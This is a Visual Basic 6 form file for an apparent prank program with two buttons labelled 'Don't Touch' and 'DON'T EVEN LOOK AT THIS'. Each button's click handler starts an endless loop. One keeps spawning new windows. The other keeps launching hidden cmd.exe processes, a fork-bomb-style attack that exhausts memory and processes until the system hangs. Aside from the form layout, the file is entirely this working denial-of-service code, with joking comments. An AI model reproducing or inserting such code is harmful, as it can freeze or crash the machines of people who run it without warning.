VERSION 5.00
Begin VB.Form DPZKMAIN 
   Caption         =   "DPZK"
   ClientHeight    =   5355
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   8280
   LinkTopic       =   "Form2"
   ScaleHeight     =   5355
   ScaleWidth      =   8280
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "DON'T EVEN LOOK AT THIS"
      Height          =   615
      Left            =   1320
      TabIndex        =   1
      Top             =   0
      Width           =   1575
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Don't Touch"
      Height          =   615
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   1335
   End
End
Attribute VB_Name = "DPZKMAIN"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Command1.Caption = "lol"
Do While True
Dim Form As New Form1
Form.Show
Loop
'lol
End Sub

Private Sub Command2_Click()
Command2.Caption = "lol"
Do While True
Dim lol
lol = Shell("cmd", vbHide)
'LOL
Loop
End Sub
' DONT TRY THOSE ABOVE
